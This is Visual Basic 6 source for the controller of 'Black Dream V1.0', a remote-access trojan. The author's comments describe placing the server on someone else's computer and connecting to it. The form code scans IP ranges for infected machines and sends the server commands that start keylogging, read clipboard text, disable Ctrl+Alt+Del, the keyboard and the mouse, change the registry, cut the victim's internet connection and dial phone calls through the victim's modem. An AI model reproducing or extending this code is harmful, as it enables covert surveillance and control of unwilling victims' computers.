               Picture         =   "FrmMain.frx":DBC2
               Top             =   840
               Width           =   480
            End
            Begin VB.Label Label21 
               AutoSize        =   -1  'True
               BackStyle       =   0  'Transparent
               Caption         =   "Number: 0 0183 456345"
               Height          =   195
               Left            =   1080
               TabIndex        =   17
               Top             =   1080
               Width           =   1740
            End
            Begin VB.Label Label20 
               AutoSize        =   -1  'True
               BackStyle       =   0  'Transparent
               Caption         =   "Name: Mr steven smith"
               Height          =   195
               Left            =   3120
               TabIndex        =   16
               Top             =   1080
               Width           =   1650
            End
            Begin VB.Label Label17 
               AutoSize        =   -1  'True
               BackStyle       =   0  'Transparent
               Caption         =   "Example:"
               Height          =   195
               Left            =   240
               TabIndex        =   15
               Top             =   1080
               Width           =   660
            End
            Begin VB.Label Label19 
               AutoSize        =   -1  'True
               BackStyle       =   0  'Transparent
               Caption         =   "Name:"
               Height          =   195
               Left            =   240
               TabIndex        =   12
               Top             =   720
               Width           =   465
            End
            Begin VB.Label Label18 
               AutoSize        =   -1  'True
               BackStyle       =   0  'Transparent
               Caption         =   "Number:"
               Height          =   195
               Left            =   240
               TabIndex        =   10
               Top             =   360
               Width           =   615
            End
         End
         Begin VB.Label Label22 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Disconnect servers computer from the internet:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   240
            TabIndex        =   18
            Top             =   2160
            Width           =   4050
         End
         Begin VB.Image Image11 
            Height          =   480
            Left            =   5400
            Picture         =   "FrmMain.frx":E48C
            Top             =   3240
            Width           =   480
         End
      End
      Begin MSComctlLib.TabStrip TabStripMenu 
         Height          =   4935
         Left            =   120
         TabIndex        =   1
         Top             =   120
         Width           =   6615
         _ExtentX        =   11668
         _ExtentY        =   8705
         MultiRow        =   -1  'True
         _Version        =   393216
         BeginProperty Tabs {1EFB6598-857C-11D1-B16A-00C0F0283628} 
            NumTabs         =   14
            BeginProperty Tab1 {1EFB659A-857C-11D1-B16A-00C0F0283628} 
               Caption         =   "Server"
               ImageVarType    =   2
            EndProperty
            BeginProperty Tab2 {1EFB659A-857C-11D1-B16A-00C0F0283628} 
               Caption         =   "Modem"
               ImageVarType    =   2
            EndProperty
            BeginProperty Tab3 {1EFB659A-857C-11D1-B16A-00C0F0283628} 
               Caption         =   "Key Logger"
               ImageVarType    =   2
            EndProperty
            BeginProperty Tab4 {1EFB659A-857C-11D1-B16A-00C0F0283628} 
               Caption         =   "Computer information"
               ImageVarType    =   2
            EndProperty
            BeginProperty Tab5 {1EFB659A-857C-11D1-B16A-00C0F0283628} 
               Caption         =   "Miscella'neous"
               ImageVarType    =   2
            EndProperty
            BeginProperty Tab6 {1EFB659A-857C-11D1-B16A-00C0F0283628} 
               Caption         =   "Clipboard"
               ImageVarType    =   2
            EndProperty
            BeginProperty Tab7 {1EFB659A-857C-11D1-B16A-00C0F0283628} 
               Caption         =   "KeyBoard"
               ImageVarType    =   2
            EndProperty
            BeginProperty Tab8 {1EFB659A-857C-11D1-B16A-00C0F0283628} 
               Caption         =   "Mouse"
               ImageVarType    =   2
            EndProperty
            BeginProperty Tab9 {1EFB659A-857C-11D1-B16A-00C0F0283628} 
               Caption         =   "System"
               ImageVarType    =   2
            EndProperty
            BeginProperty Tab10 {1EFB659A-857C-11D1-B16A-00C0F0283628} 
               Caption         =   "File / Directory"
               ImageVarType    =   2
            EndProperty
            BeginProperty Tab11 {1EFB659A-857C-11D1-B16A-00C0F0283628} 
               Caption         =   "Fun"
               ImageVarType    =   2
            EndProperty
            BeginProperty Tab12 {1EFB659A-857C-11D1-B16A-00C0F0283628} 
               Caption         =   "Run"
               ImageVarType    =   2
            EndProperty
            BeginProperty Tab13 {1EFB659A-857C-11D1-B16A-00C0F0283628} 
               Caption         =   "Registry"
               ImageVarType    =   2
            EndProperty
            BeginProperty Tab14 {1EFB659A-857C-11D1-B16A-00C0F0283628} 
               Caption         =   "Control"
               ImageVarType    =   2
            EndProperty
         EndProperty
      End
   End
   Begin VB.PictureBox FrmDialog 
      Height          =   5295
      Index           =   0
      Left            =   0
      ScaleHeight     =   5235
      ScaleWidth      =   6915
      TabIndex        =   62
      Top             =   0
      Width           =   6975
      Begin VB.CommandButton CmdClear 
         Caption         =   "Cl&ear"
         Height          =   375
         Left            =   5760
         TabIndex        =   95
         Top             =   3360
         Width           =   1095
      End
      Begin VB.CommandButton CmdConnectScan 
         Caption         =   "Co&nnect"
         Enabled         =   0   'False
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Left            =   5760
         TabIndex        =   94
         Top             =   4800
         Width           =   1095
      End
      Begin VB.Frame Frame3 
         Caption         =   "IP scanner (Find server hidden in address)"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   1215
         Left            =   120
         TabIndex        =   75
         Top             =   1800
         Width           =   6735
         Begin VB.CommandButton CmdCancelScan 
            Caption         =   "C&ancel"
            Enabled         =   0   'False
            Height          =   375
            Left            =   5520
            TabIndex        =   85
            Top             =   720
            Width           =   1095
         End
         Begin VB.CommandButton CmdScan 
            Caption         =   "&Scan"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   5520
            TabIndex        =   84
            Top             =   240
            Width           =   1095
         End
         Begin VB.TextBox IPEND 
            Height          =   285
            Index           =   3
            Left            =   3600
            MaxLength       =   3
            TabIndex        =   83
            Text            =   "101"
            Top             =   720
            Width           =   615
         End
         Begin VB.TextBox IPEND 
            Height          =   285
            Index           =   2
            Left            =   2760
            MaxLength       =   3
            TabIndex        =   82
            Text            =   "100"
            Top             =   720
            Width           =   615
         End
         Begin VB.TextBox IPEND 
            Height          =   285
            Index           =   1
            Left            =   1920
            MaxLength       =   3
            TabIndex        =   81
            Text            =   "100"
            Top             =   720
            Width           =   615
         End
         Begin VB.TextBox IPEND 
            Height          =   285
            Index           =   0
            Left            =   1080
            MaxLength       =   3
            TabIndex        =   80
            Text            =   "100"
            Top             =   720
            Width           =   615
         End
         Begin VB.TextBox IPSTART 
            Height          =   285
            Index           =   3
            Left            =   3600
            MaxLength       =   3
            TabIndex        =   79
            Text            =   "100"
            Top             =   360
            Width           =   615
         End
         Begin VB.TextBox IPSTART 
            Height          =   285
            Index           =   2
            Left            =   2760
            MaxLength       =   3
            TabIndex        =   78
            Text            =   "100"
            Top             =   360
            Width           =   615
         End
         Begin VB.TextBox IPSTART 
            Height          =   285
            Index           =   1
            Left            =   1920
            MaxLength       =   3
            TabIndex        =   77
            Text            =   "100"
            Top             =   360
            Width           =   615
         End
         Begin VB.TextBox IPSTART 
            Height          =   285
            Index           =   0
            Left            =   1080
            MaxLength       =   3
            TabIndex        =   76
            Text            =   "100"
            Top             =   360
            Width           =   615
         End
         Begin VB.Image Image9 
            Height          =   480
            Left            =   4800
            Picture         =   "FrmMain.frx":ED56
            Top             =   240
            Width           =   480
         End
         Begin VB.Label Label33 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "End:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   240
            TabIndex        =   93
            Top             =   720
            Width           =   345
         End
         Begin VB.Label Label13 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   ":"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   2640
            TabIndex        =   92
            Top             =   720
            Width           =   45
         End
         Begin VB.Label Label11 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   ":"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   3480
            TabIndex        =   91
            Top             =   720
            Width           =   45
         End
         Begin VB.Label Label10 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   ":"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   1800
            TabIndex        =   90
            Top             =   720
            Width           =   45
         End
         Begin VB.Label Label9 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   ":"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   2640
            TabIndex        =   89
            Top             =   360
            Width           =   45
         End
         Begin VB.Label Label8 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   ":"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   3480
            TabIndex        =   88
            Top             =   360
            Width           =   45
         End
         Begin VB.Label Label7 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   ":"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   1800
            TabIndex        =   87
            Top             =   360
            Width           =   45
         End
         Begin VB.Label Label6 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Start:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   240
            TabIndex        =   86
            Top             =   360
            Width           =   480
         End
      End
      Begin VB.Frame Frame2 
         Caption         =   "Connection commands"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   1575
         Left            =   3720
         TabIndex        =   70
         Top             =   120
         Width           =   3135
         Begin VB.CommandButton CmdRestart 
            Caption         =   "Restart"
            Height          =   375
            Left            =   1920
            TabIndex        =   74
            Top             =   840
            Width           =   1095
         End
         Begin VB.CommandButton CmdConnectionInfo 
            Caption         =   "&Local/Remote Info"
            Height          =   375
            Left            =   120
            TabIndex        =   73
            Top             =   840
            Width           =   1695
         End
         Begin VB.CommandButton CmdConnect 
            Caption         =   "&Connect"
            Default         =   -1  'True
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   1920
            TabIndex        =   72
            Top             =   360
            Width           =   1095
         End
         Begin VB.CommandButton CmdCloseCnnt 
            Caption         =   "Cl&ose connection"
            Height          =   375
            Left            =   120
            TabIndex        =   71
            Top             =   360
            Width           =   1695
         End
      End
      Begin VB.Frame Frame1 
         Caption         =   "IP Address connection properties"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   1575
         Left            =   120
         TabIndex        =   63
         Top             =   120
         Width           =   3495
         Begin VB.TextBox ConnectPort 
            BackColor       =   &H8000000F&
            Height          =   285
            Left            =   960
            Locked          =   -1  'True
            TabIndex        =   65
            Text            =   "4432"
            Top             =   720
            Width           =   2415
         End
         Begin VB.TextBox IPConnect 
            Height          =   285
            Left            =   960
            MaxLength       =   15
            TabIndex        =   64
            Text            =   "127.0.0.1"
            Top             =   360
            Width           =   2415
         End
         Begin VB.Label lblstate 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Disconnected"
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   960
            TabIndex        =   69
            Top             =   1200
            Width           =   1185
         End
         Begin VB.Label Label5 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "State:"
            Height          =   195
            Left            =   120
            TabIndex        =   68
            Top             =   1200
            Width           =   450
         End
         Begin VB.Label Label4 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "IP address:"
            ForeColor       =   &H80000008&
            Height          =   195
            Left            =   120
            TabIndex        =   67
            Top             =   360
            Width           =   825
         End
         Begin VB.Label Label3 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Port:"
            ForeColor       =   &H80000008&
            Height          =   195
            Left            =   120
            TabIndex        =   66
            Top             =   720
            Width           =   360
         End
      End
      Begin MSWinsockLib.Winsock WinsockIPScan 
         Left            =   240
         Top             =   3480
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
      End
      Begin MSWinsockLib.Winsock WinSockCtl 
         Left            =   720
         Top             =   3480
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
      End
      Begin MSComDlg.CommonDialog CommonDialog 
         Left            =   1200
         Top             =   3480
         _ExtentX        =   847
         _ExtentY        =   847
         _Version        =   393216
         CancelError     =   -1  'True
      End
      Begin MSComctlLib.ListView ListIP 
         Height          =   1815
         Left            =   120
         TabIndex        =   96
         Top             =   3360
         Width           =   5535
         _ExtentX        =   9763
         _ExtentY        =   3201
         View            =   3
         LabelEdit       =   1
         Sorted          =   -1  'True
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         OLEDropMode     =   1
         AllowReorder    =   -1  'True
         FullRowSelect   =   -1  'True
         GridLines       =   -1  'True
         _Version        =   393217
         Icons           =   "FilePics"
         SmallIcons      =   "FilePics"
         ColHdrIcons     =   "FilePics"
         ForeColor       =   -2147483640
         BackColor       =   -2147483643
         BorderStyle     =   1
         Appearance      =   1
         OLEDropMode     =   1
         NumItems        =   0
      End
      Begin VB.Image Image5 
         Height          =   480
         Left            =   6360
         Picture         =   "FrmMain.frx":F620
         Top             =   4200
         Width           =   480
      End
      Begin VB.Label Label34 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Listed servers found:"
         Height          =   195
         Left            =   120
         TabIndex        =   98
         Top             =   3120
         Width           =   1530
      End
      Begin VB.Label lblscan 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Scanning: 0.0.0.0"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   195
         Left            =   1800
         TabIndex        =   97
         Top             =   3120
         Width           =   1410
      End
   End
End
Attribute VB_Name = "FrmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'IF YOU DO NOT HAVE A NETWORK OR INTERNET TO TRY THIS PROGRAM ON
'USE THE LOCAL IP ADDRESS WHICH IS 127.0.0.1

'TO TEST RUN THE SERVER AND THEN THE CLIENT. CONNECT TO YOURSELF WITH THE LOCAL
'IP

                'HAVE FUN!!!! :-)


'Black Dream V1.0
'
'This application is easily expandable and easy to use. To get this to work
'you need to place the server on someones computer and then connect to them
'by specifying the IP address in the IP text box. If you cannot get their IP
'you can do a search for all IP addresses which may hold the server and are
'running it at the time. If you do use the search utility, then if someone
'does hold the server and the search util has found that server it will
'be listed in the listbox and also come with the server version, user name and
'OS version. To connect to the listed person click on the one you want and then
'click on the BOTTOM CONNECT BUTTON. Or unless you know the IP address, like
'I said just place it in the IP textbox and click on the TOP CONNECT BUTTON.
'
'
'
' Their are a few bugs in this program, Ie file download (If you can find them)
' and would like ideas on how to improve the program and fix any problems.
' To do so please email me at NeoBPI@Yahoo.com and if you didn't find any problems
' then please vote for the program, and leave a comment. If you do leave a comment
' that would be greate because I can get to hear all your ideas and other people
' might be tempted to have a go at a simalar program.
'
'
' If your totally against this type of program, in other words don't like the
' idea of people getting into other peoples computers then please don't run this
' program if you have any problem. Thanks and I hope to hear from you. :-)
'
'
'
'               By Mark Withers
'               Pre-Instinct® Software
'
Dim SendData As String
Dim ScanRun As Boolean
Dim WaitForInfo As Boolean
Dim StoredData(0 To 10) As String

Private Sub CmdAddtoDoc_Click()
    On Error Resume Next
    If TextDocumentAddfilename.Text = "" Then MsgBox "Please specify a file to add to the documents list.", vbInformation, "Add Documents": Exit Sub
    WinSockCtl.SendData "009" & TextDocumentAddfilename.Text
End Sub

Private Sub CmdApplyClearClip_Click()
    On Error Resume Next
    WinSockCtl.SendData "082"
End Sub

Private Sub CmdApplySetCursorPos_Click()
    On Error Resume Next
    If SetCursorX.Text = "" Then MsgBox "Please specify an (X) position to set the cursors position.", vbInformation, "Cursor Positioning": Exit Sub
    If SetCursorY.Text = "" Then MsgBox "Please specify an (Y) position to set the cursors position.", vbInformation, "Cursor Positioning": Exit Sub
    WinSockCtl.SendData "037" & SetCursorX.Text & Chr(0) & SetCursorY.Text
End Sub

Private Sub CmdBrowser_Click()
    On Error Resume Next
    FrmFileBrowse.Show
End Sub

Private Sub CmdCall_Click()
    On Error Resume Next
    If TextPhone.Text = "" Then MsgBox "Please specify a phone number to ring.", vbInformation, "Phone Call": Exit Sub
    If CallName.Text = "" Then MsgBox "Please specify a name for the phone call.", vbInformation, "Phone Call": Exit Sub
    Value& = MsgBox("Making a phone call will disconnect you from the server. Do you want to continue?", vbYesNo + vbQuestion, "Phone call")
    If Value& = vbYes Then WinSockCtl.SendData "010" & TextPhone & Chr(0) & CallName
End Sub

Private Sub CmdCancelScan_Click()
    MenuED 0, True
    MsgBox "Your IP scan has been canceled.", vbInformation, "Scan"
    lblscan.Caption = "Scanning: 0.0.0.0"
    WinsockIPScan.Close
End Sub

Private Sub CmdChangeWallpaper_Click()
    On Error Resume Next
    If ChangeWallpaperPath.Text = "" Then MsgBox "Please specify a picture to set as the wallpaper.", vbInformation, "Wallpaper settings": Exit Sub
    WinSockCtl.SendData "101" & ChangeWallpaperPath.Text
End Sub

Private Sub CmdCheckForSoundCard_Click()
    On Error Resume Next
    WinSockCtl.SendData "015"
End Sub

Private Sub CmdCheckPath_Click()
    On Error Resume Next
    If ExecPath.Text = "" Then MsgBox "Please specify a file to check to see if it is executable or not.", vbInformation, "Executable checking": Exit Sub
    WinSockCtl.SendData "071" & ExecPath.Text
End Sub

Private Sub CmdClearClipBoardLog_Click()
    TextClipBoard.Text = ""
End Sub

Private Sub CmdClearDocuments_Click()
    On Error Resume Next
    WinSockCtl.SendData "008"
End Sub

Private Sub CmdClearInfo_Click()
    TextComputerInfo.Text = ""
End Sub

Private Sub CmdClearKeyBoardCells_Click()
    KeyBoardType.Text = ""
    ChrBlinkRate.Text = ""
    SetChrRate.Text = ""
End Sub

Private Sub CmdClearKeyLog_Click()
    TextKeyLog.Text = ""
End Sub

Private Sub CmdClearMouseCells_Click()
    DoubleClickRate.Text = ""
    SetCursorX.Text = ""
    SetCursorY.Text = ""
    MouseXPos.Text = ""
    MouseYPos.Text = ""
    TextMouseTrail.Text = ""
End Sub

Private Sub CmdClearSystemTextCells_Click()
    TextDocumentAddfilename.Text = ""
    TextHwndWindow.Text = ""
    TextWindowName.Text = ""
    ClassWindowName.Text = ""
End Sub

Private Sub CmdCloseCDROM_Click()
    On Error Resume Next
    WinSockCtl.SendData "041"
End Sub

Private Sub CmdConnect_Click()
    
    If IPConnect.Text = "" Then MsgBox "Please specify an IP address to connect to.", vbInformation, "Connection": Exit Sub
    If ConnectPort.Text = "" Then MsgBox "Please specify a port to connect to.", vbInformation, "Connection": Exit Sub
    
    On Error GoTo FinaliseError
    
    If WinSockCtl.State <> 7 Then WinSockCtl.Close
    WinSockCtl.Connect IPConnect, ConnectPort

    Exit Sub
    
FinaliseError:
    Value& = MsgBox("Error, you may be already connected to a address at the moment. Would you like to disconnect and connect to the new address?", vbYesNo + vbCritical, "Error")
    If Value& = vbYes Then
        If CheckServer = False Then
            MsgBox "Error, could not connect to new address. The following errors could of occured:" & vbNewLine & vbNewLine & "1: Address is invalid" & vbNewLine & "2: Address does not hold a server" & vbNewLine & "3: Address could hold a firewall" & vbNewLine & "4: Server might not be running" & vbNewLine & "5: Port in use" & vbNewLine & "6: May be connected to another address" & vbNewLine & "7: Your fire wall may not allow out going data from this aplication.", vbCritical, "Error"
            lblstate.Caption = "Disconnected"
            UnloadFormsOpen
            FrmDialog.Item(0).Visible = True
            FrmDialog.Item(1).Visible = False
        End If
    Else
        MsgBox "You have not been connected to the new specified address.", vbInformation, "Connection"
        lblstate.Caption = "Disconnected"
        UnloadFormsOpen
        FrmDialog.Item(0).Visible = True
        FrmDialog.Item(1).Visible = False
    End If
End Sub

Private Function CheckServer() As Boolean
    On Error GoTo FinaliseError
    WinSockCtl.Close
    WinSockCtl.Connect IPConnect, ConnectPort
    CheckServer = True
    Exit Function
FinaliseError:
    CheckServer = False
End Function

Private Sub CmdConnectionInfo_Click()
    On Error GoTo FinaliseError
    SendData = "TESTSERVER"
    WinSockCtl.SendData SendData
    
    FrmConnectionInfo.TagInfo.Item(0).Text = Me.WinSockCtl.LocalHostName
    FrmConnectionInfo.TagInfo.Item(1).Text = Me.WinSockCtl.LocalPort
    FrmConnectionInfo.TagInfo.Item(2).Text = Me.WinSockCtl.LocalIP
    FrmConnectionInfo.TagInfo.Item(3).Text = Me.WinSockCtl.RemoteHost
    FrmConnectionInfo.TagInfo.Item(4).Text = Me.WinSockCtl.RemotePort
    FrmConnectionInfo.TagInfo.Item(5).Text = Me.WinSockCtl.RemoteHostIP
    
    FrmConnectionInfo.Show
    Exit Sub
FinaliseError:
    UnloadFormsOpen
    FrmDialog.Item(0).Visible = True
    FrmDialog.Item(1).Visible = False
    lblstate.Caption = "Disconnected"
    MsgBox "Error, could not locate server. Please try again.", vbCritical, "Connection Error"
End Sub

Private Sub CmdConnectScan_Click()

    'If ListIP.SelectedItem.Text = "" Then MsgBox "Please specify an IP address to connect to.", vbInformation, "Connection": Exit Sub
    If ConnectPort.Text = "" Then MsgBox "Please specify a port to connect to.", vbInformation, "Connection": Exit Sub
    
    On Error GoTo FinaliseError
    
    If WinSockCtl.State <> 7 Then WinSockCtl.Close
    WinSockCtl.Connect ListIP.SelectedItem.Text, ConnectPort
    IPConnect.Text = ListIP.SelectedItem.Text
   
    FrmDialog.Item(0).Visible = False
    FrmDialog.Item(1).Visible = True
   
    Exit Sub
    
FinaliseError:
    Value& = MsgBox("Error, you may be already connected to a address at the moment. Would you like to disconnect and connect to the new address?", vbYesNo + vbCritical, "Error")
    If Value& = vbYes Then
        If CheckServer = False Then
            MsgBox "Error, could not connect to new address. The following errors could of occured:" & vbNewLine & vbNewLine & "1: Address is invalid" & vbNewLine & "2: Address does not hold a server" & vbNewLine & "3: Address could hold a firewall" & vbNewLine & "4: Server might not be running" & vbNewLine & "5: Port in use" & vbNewLine & "6: May be connected to another address" & vbNewLine & "7: Your fire wall may not allow out going data from this aplication.", vbCritical, "Error"
            lblstate.Caption = "Disconnected"
            UnloadFormsOpen
            FrmDialog.Item(0).Visible = True
            FrmDialog.Item(1).Visible = False
        End If
    Else
        MsgBox "You have not been connected to the new specified address.", vbInformation, "Connection"
        lblstate.Caption = "Disconnected"
        UnloadFormsOpen
        FrmDialog.Item(0).Visible = True
        FrmDialog.Item(1).Visible = False
    End If
End Sub

Private Sub CmdDisableCtrlAltDel_Click()
    On Error Resume Next
    WinSockCtl.SendData "059"
End Sub

Private Sub CmdDisableKeyBoard_Click()
    On Error Resume Next
    WinSockCtl.SendData "094"
End Sub

Private Sub CmdDisableMouse_Click()
    On Error Resume Next
    WinSockCtl.SendData "0141"
End Sub

Private Sub CmdDisconnect_Click()
    On Error Resume Next
    Value& = MsgBox("Disconnecting server's computer from the net will disconnect you from the server, would you like to continue?", vbYesNo + vbQuestion, "Disconnecting server's computer from the net")
    If Value& = vbYes Then WinSockCtl.SendData "088"
End Sub

Private Sub CmdEnableCtrlAltDel_Click()
    On Error Resume Next
    WinSockCtl.SendData "060"
End Sub

Private Sub CmdEnableMouse_Click()
    On Error Resume Next
    WinSockCtl.SendData "0140"
End Sub

Private Sub CmdEndKeyLogging_Click()
    On Error Resume Next
    WinSockCtl.SendData "103"
End Sub

Private Sub CmdEndServer_Click()
    On Error Resume Next
    Value& = MsgBox("Are you sure you want to dissconnect server? (Please read information given)", vbYesNo + vbQuestion, "Disconnecting Server")
    If Value& = vbYes Then WinSockCtl.SendData "000"
End Sub

Private Sub CmdFormatDialog_Click()
    On Error Resume Next
    If TextFormatDriveLetter.Text = "" Then MsgBox "Please specify a drive letter, for the format drive dialog to appear.", vbInformation, "Show Format Drive dialog for specified drive letter": Exit Sub
    WinSockCtl.SendData "070" & TextFormatDriveLetter.Text & ":" '(:) Stops the user from typing any more that the drive letter
End Sub

Private Sub CmdGetKeyboardType_Click()
    On Error Resume Next
    WinSockCtl.SendData "002"
End Sub

Private Sub CmdGetRate_Click()
    On Error Resume Next
    WinSockCtl.SendData "003"
End Sub

Private Sub CmdGetText_Click()
    On Error Resume Next
    WinSockCtl.SendData "085"
End Sub

Private Sub CmdGetTypeMousePoint_Click()
    On Error Resume Next
    If MousePosType01.Value = True Then
        WinSockCtl.SendData "038"
    Else
        WinSockCtl.SendData "039"
    End If
End Sub

Private Sub CmdGetWindow_Click()
    On Error Resume Next
    If TextHwndWindow.Text = "" Then MsgBox "Please specify a Hwnd window, to return the window Class and window Name.", vbInformation, "Hwnd Window request": Exit Sub
    WinSockCtl.SendData "077" & TextHwndWindow.Text
End Sub

Private Sub CmdHideClock_Click()
    On Error Resume Next
    WinSockCtl.SendData "051"
End Sub

Private Sub CmdHideDesktop_Click()
    On Error Resume Next
    WinSockCtl.SendData "020"
End Sub

Private Sub CmdHideDesktopIcons_Click()
    On Error Resume Next
    WinSockCtl.SendData "066"
End Sub

Private Sub CmdHideProgramsinTB_Click()
    On Error Resume Next
    WinSockCtl.SendData "055"
End Sub

Private Sub CmdHideStartButton_Click()
    On Error Resume Next
    WinSockCtl.SendData "049"
End Sub

Private Sub CmdHideSysIcons_Click()
    On Error Resume Next
    WinSockCtl.SendData "053"
End Sub

Private Sub CmdHideTaskBar_Click()
    On Error Resume Next
    WinSockCtl.SendData "018"
End Sub

Private Sub CmdHideToolbar_Click()
    On Error Resume Next
    WinSockCtl.SendData "057"
End Sub

Private Sub CmdIconChangeDialog_Click()
    On Error Resume Next
    If TextExecutableFile.Text = "" Then MsgBox "Please specify an executable file which is located on the remote host.", vbInformation, "Icon change dialog": Exit Sub
    WinSockCtl.SendData "068" & TextExecutableFile.Text
End Sub

Private Sub CmdKeyOptions_Click()
    On Error Resume Next
    FrmKeyCtrls.Show
End Sub

Private Sub CmdMail_Click()
    On Error Resume Next
    Shell "start mailto:NeoBPI@Yahoo.com", vbNormalFocus
End Sub

Private Sub CmdOpenCDROM_Click()
    On Error Resume Next
    WinSockCtl.SendData "040"
End Sub

Private Sub CmdOpenFindDialog_Click()
    On Error Resume Next
    WinSockCtl.SendData "065" & "C:\" 'This string is customisable
End Sub

Private Sub CmdOpenSystemInfo_Click()
    On Error Resume Next
    WinSockCtl.SendData "006"
End Sub

Private Sub CmdPlay_Click()
    On Error Resume Next
    If TextPlayWav.Text = "" Then MsgBox "Please specify a sound file to play.", vbInformation, "Playing sounds": Exit Sub
    WinSockCtl.SendData "022" & TextPlayWav.Text
End Sub

Private Sub CmdPrintText_Click()
    On Error Resume Next
    FrmPrintText.Show
End Sub

Private Sub CmdRegGet_Click()
    
    On Error Resume Next
    
    If RegPath.Text = "" Then MsgBox "Please enter a registry path.", vbInformation, "Registry options": Exit Sub
    If EntryName.Text = "" Then MsgBox "Please enter a registry entry.", vbInformation, "Registry options": Exit Sub
    
    For M = 1 To Len(RegPath)
        If Right(RegPath, 1) = "\" Or Right(RegPath, 1) = "/" Then RegPath = Left(RegPath, Len(RegPath) - 1)
    Next M
    
    If RegOpt0.Value = True Then
        WinSockCtl.SendData "025" & RegPath & Chr(0) & EntryName
    ElseIf RegOpt1.Value = True Then
        WinSockCtl.SendData "027" & RegPath & Chr(0) & EntryName
    ElseIf RegOpt2.Value = True Then
        WinSockCtl.SendData "029" & RegPath & Chr(0) & EntryName
    End If
    
End Sub

Private Sub CmdRegSet_Click()
    
    On Error Resume Next
    
    If RegPath.Text = "" Then MsgBox "Please enter a registry path.", vbInformation, "Registry options": Exit Sub
    If EntryName.Text = "" Then MsgBox "Please enter a registry entry.", vbInformation, "Registry options": Exit Sub
